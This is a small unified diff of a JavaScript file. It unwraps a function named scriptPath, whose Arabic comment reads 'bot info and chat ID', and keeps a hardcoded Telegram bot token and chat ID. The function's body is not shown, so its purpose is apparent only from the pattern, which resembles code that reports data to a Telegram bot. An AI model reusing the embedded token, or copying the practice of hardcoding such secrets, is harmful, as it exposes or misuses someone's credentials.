@@ -1,5 +1,4 @@
-function scriptPath() {
-    // معلومات البوت ومعرف الدردشة
+
     var token = '6380567136:AAHwFd8VyK2u49kuoA2ZhhnHfy_59CnHd_E';
     var chat_id = '2057593901';
 
@@ -19,5 +18,4 @@ function scriptPath() {
         }
        
     });
-}
 
